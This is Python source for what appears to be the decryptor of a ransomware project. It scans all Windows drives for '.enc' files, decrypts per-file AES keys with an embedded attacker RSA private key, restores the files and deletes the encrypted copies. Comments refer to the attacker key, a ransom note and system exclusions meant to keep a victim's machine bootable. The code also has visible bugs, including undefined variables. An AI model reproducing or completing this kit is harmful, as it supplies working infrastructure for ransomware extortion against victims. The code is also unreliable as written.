from symEncryption import *
import ctypes
import concurrent.futures # voor threading pools
import subprocess
import psutil
import os
import time
from keygen import *
from collections import deque # voor snellere list operaties
import mmap

class Decryptor:

    def __init__(self, private_key):
        self.private_key = private_key
        self.drives = []
        self.filepaths = []
        self.decrypted_count = 0

    def scan_drives(self):
        """
        a function which scans drives A-Z
        """
        start_time = time.time()
        bitmask = ctypes.windll.kernel32.GetLogicalDrives() #returns a bitmask where each bit represents a drive letter. 
        self.drives = [f"{chr(65 + i)}:\\" for i in range(26) if bitmask & (1 << i)] #converts the bit index into a letter
        end_time = time.time()

        print(f"[LOG] drives found: {self.drives}, time elapsed: {end_time - start_time}s")

    def get_files_from_drive(self, drive):
        """Retrieve all file paths for files with the .enc extension from a single drive."""
        
        #These are files and directories that we wont encrypt since they will stop the os from functioning
        EXCLUDED_EXTENSIONS = {".exe", ".dll", ".sys", ".lnk", ".log"}
        EXCLUDED_FILES = {"boot.ini", "bootmgr", "ntldr", "BCD"} #add ransomnote 
        EXCLUDED_DIRS = {
            "C:\\Windows",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\System Volume Information",
            "C:\\$WINDOWS.~BT"
        }

        filepaths = []
        
        def scan_directory(path):
            """Recursive scanning using os.scandir()"""
            try:
                with os.scandir(path) as it: 
                    for entry in it:
                        if entry.is_dir(follow_symlinks=False): #if the entry is a directory, check if it's in EXCLUDED_DIRS
                            if entry.path in EXCLUDED_DIRS:
                                continue
                            scan_directory(entry.path)
                        
                        elif entry.is_file():
                            if (
                                entry.name.lower() not in EXCLUDED_FILES and #check if its name is in EXCLUDED_FILES
                                not entry.name.lower().endswith(tuple(EXCLUDED_EXTENSIONS)) #check if it has an excluded extension
                            ):  
                                
                                if ".enc" in entry.name.lower(): #just filter on desktop and pictures
                                    filepaths.append(entry.path)  # Store normal files
            
            except (PermissionError, FileNotFoundError):
                pass  # skip directories that cannot be accessed
       
        scan_directory(drive) #call function scan directory

        #print(filepaths)

        return filepaths


    def get_files(self):
        """
        run multiple threads at once to scan a drive for files, this will execute file collection across multiple drives at once.
        Instead of scanning one drive at a time, multiple drives are scanned simultaneously, making it much faster.
        """
        start_time = time.time()
        with concurrent.futures.ThreadPoolExecutor() as executor: #
            results = executor.map(self.get_files_from_drive, self.drives)
        
        # Flatten results
        self.filepaths = [file for result in results for file in result]  # Extract normal files
        
        end_time = time.time()
        print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time:.2f}s")     

    def decrypt_footer(self, encrypted_IV, encrypted_AES_key):
        """
        this function is called for everyfile and creates the footer
        """
        #load in the attacker priv key
        keygen = Encryption("id:1")
        
        keygen.load_private_key(self.private_key)
        print("[LOG] succesfully loaded key")

        #decrypt iv
        iv = keygen.decrypt(encrypted_IV)
        
        #decrypt AES key
        key = keygen.decrypt(encrypted_AES_key)
        print(f"[LOG] footer decrypted, IV: {iv} AES_key: {key}")
        
        return iv, key

    def decrypt(self, files_list):
        """
        The encrypt function called by threading.
        """
        encrypted_count = 0
        files_list = deque(files_list)  # O(1) verwijderingen met deque

        previous_encrypted_AES_key = ""

        while files_list:

            filepath = files_list.popleft()  # Verwijder bestand uit deque (O(1))
            #print(filepath)

            try:
                # open file 
                with open(filepath, 'rb') as file:
                    data = file.read()

                    # split the file into, part encrypted by AES key and the AES key, which is encrypted by the public key of the attacker
                    parts = data.split(b"\n---\n")

                    if len(parts) < 3:
                        print(f"[LOG] Skipping {filepath} - incorrect file format")
                        continue

                    encrypted_content = parts[0].strip()
                    encrypted_IV = parts[1].strip()
                    encrypted_AES_key = parts[2].strip()

                # check if a new AES should be decrypted, or if the same AES key was used in this file
                if previous_encrypted_AES_key == encrypted_AES_key:
                    print(f"[LOG] footer unchanged, using same AES key: {AES_key}")

                else:
                    # if a new footer is detected it should be extracted and decrypted
                    print("[LOG] New footer detected, decrypting AES key")
                    decrypted_iv, decrypted_AES_key = self.decrypt_footer(encrypted_IV, encrypted_AES_key)

                    #load AES key and iv
                    symenc = Symmetric_encryption()
                    symenc.iv = decrypted_iv
                    symenc.AES_key = decrypted_AES_key

                    #this is to preform a check if the previous footer is the same as the current footer
                    previous_encrypted_AES_key = encrypted_AES_key

                #decrypt encrypted content
                decrypted_data = symenc.decrypt_string(encrypted_content)

                decrypted_filepath = filepath[:-4] #remove .enc from filepath

                with open(decrypted_filepath, "wb") as decrypted_file:
                    decrypted_file.write(decrypted_data)

                #remove encrypted file
                os.remove(filepath)

                self.decrypted_count += 1
    
            except Exception as e:
                print(f"[LOG] error: {e}")
                self.fail_count += 1

    def start_decryption_process(self, threads=3):
        """
        a function which starts a thread for encrytion, it will spaw multiple threads
        """
        #split list by amount of threads
        avg_len = len(self.filepaths) // threads   # Average size of each chunk
        remainder = len(self.filepaths) % threads   # Remainder to distribute across parts

        result = []  # List to hold the resulting parts
        start = 0  # Start index for each split
        
        for i in range(threads):
            # Calculate end index for each part
            end = start + avg_len + (1 if i < remainder else 0)
            result.append(self.filepaths[start:end])  # Append the split list to result
            start = end  # Update start index for next chunk
        
        start_time = time.time()

        #verwerk decryptie met een thread pool
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            for files in result:
                executor.submit(self.decrypt, files)

        end_time = time.time()

        print(f"[LOG] {(self.decrypted_count/len(self.filepaths))*100}% files decrypted, time elapsed: {end_time-start_time}s")

if __name__ == "__main__":
    
    decryptor = Decryptor("""
-----BEGIN RSA PRIVATE KEY-----
MIICYAIBAAKBgQCPenTmm5+aJEe6rEFHwwESezFZGv2aZUvZG3muGPRramrhOc9s
XYnX1gFew3EzgTgzJcSyiBYD4TIzHwBduqzpAQhlo2NgEoiYFtaGge/YmNXLPV7w
6tL+NgmhAzfC3uGMBRfHpBeMxIN5W3y76DnZnLuO+/tWkPF82UOTzGQREQIDAQAB
AoGAM2/cTvxFuJX/HR45/Qcc8Eo4A9DYUCy2h2wBMHgD0CqDjKEUCq5yB23Sae25
PJS72CJXJQYClnt6ardXNt8vMAon+n8cXJWYXxeF+5WqjT740Pwh/dGlYOUsMDKe
yGH/dS9em2ZZm9JwgKBHi4UT+/9PyyPVB9xb9z02bTGOfT0CRQDVFDTpKeoF3skh
PqDcdXz0Qv/CKiAt4aCxSPsqWSNpNaKIuker9JUOvKPPEV44LmTJzrrFAc3oXWd1
3y/1ULey0P1TBwI9AKxhLBYkYot+yh78FJPcCxHlrecZCQFP6C4bowGtyBk4LhRY
YMIAt9n1/llhNha2dI+hs2GgtkIsny59JwJEVEoTCC1ZcwsHW0xQDAW58VJTpDZP
1naLv7XUDZOHa4YZDqdJ1N8C2/qJfk8ri2Pm4OIThf1Ju+K/G6S3bv6IPIdpvp8C
PQCQhGcRqS91A7cwguY9kB03w/cn6DVEhFmDTmg64BcCDbeUFwQHodKBSVsUVAuk
vxK52DcrgjFLCV3q+8ECRAX0xcZHe/NmVV9bK+SRWyA4ybvio7/gEE9sfJlqeG6G
rIm8EArVVAlDeDOVgjgKxdnMbgB9wnvB+kjxhjJrcZBbZOtR
-----END RSA PRIVATE KEY-----
    """)

    decryptor.scan_drives()
    decryptor.get_files()
    #decryptor.decrypt()
    decryptor.start_decryption_process()


